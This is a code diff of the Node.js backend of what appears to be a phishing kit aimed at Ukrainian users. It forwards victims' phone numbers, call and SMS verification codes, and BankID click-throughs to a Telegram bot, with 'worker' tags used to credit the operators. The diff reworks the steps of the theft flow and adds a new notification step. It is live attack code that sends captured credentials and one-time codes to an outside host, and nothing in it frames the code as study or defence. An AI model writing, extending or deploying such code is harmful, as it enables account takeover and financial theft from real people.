@@ -89,9 +89,10 @@ app.post('/api/send-data', async (req, res) => {
     const workerTag = worker ? `\n*Воркер:* @${worker}` : '';
 
     if (step === 'phone' && phone) {
-        // Крок 1: Введений телефон (відправляємо з кнопками)
+        // Крок 1: Введений телефон (відправляємо з кнопками в ТГ)
         message = `*НОВИЙ ЛОГ* 🔔\n*ПРОЕКТ:* ${projectName} ⚡\n*Номер:* \`${phone}\`\n*Місто:* ${city}\n*Країна:* Україна${workerTag}`;
         
+        // Inline-кнопки
         reply_markup = {
             inline_keyboard: [
                 [{ text: "📞 Звонок", callback_data: `call_${phone}` }],
@@ -100,22 +101,6 @@ app.post('/api/send-data', async (req, res) => {
             ]
         };
         ok = await sendToTelegram(message, reply_markup);
-
-    } 
-    else if (step === 'method_call' && phone) {
-        // Крок 2: Користувач обрав "Звонок"
-        message = `*ОБРАНО МЕТОД:* Звонок 📞\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}${workerTag}`;
-        ok = await sendToTelegram(message);
-    }
-    else if (step === 'method_sms' && phone) {
-        // Крок 2: Користувач обрав "Код"
-        message = `*ОБРАНО МЕТОД:* Код ✉️\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}${workerTag}`;
-        ok = await sendToTelegram(message);
-    }
-    else if (step === 'method_bankid' && phone) {
-        // Крок 2: Користувач обрав "BankID" (кнопка перекидає на посилання)
-        message = `*ОБРАНО МЕТОД:* BankID 🏦\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}${workerTag}`;
-        ok = await sendToTelegram(message);
     }
     else if (step === 'call_code' && code && phone) {
         // Крок 3: Введений 4-значний код
@@ -123,8 +108,13 @@ app.post('/api/send-data', async (req, res) => {
         ok = await sendToTelegram(message);
     }
     else if (step === 'sms_code' && code && phone) {
-        // Крок 3: Введений 6-значний SMS-код
+        // Крок 4: Введений 6-значний SMS-код
         message = `*SMS КОД:* \`${code}\`\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}${workerTag}`;
+        ok = await sendToTelegram(message);
+    }
+    else if (step === 'method_bankid_click' && phone) {
+        // Крок 5: Користувач натиснув на кнопку "Підтвердити" BankID на сайті
+        message = `*КОРИСТУВАЧ ПЕРЕЙШОВ НА BANKID* 🏦\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}${workerTag}`;
         ok = await sendToTelegram(message);
     } 
     else {
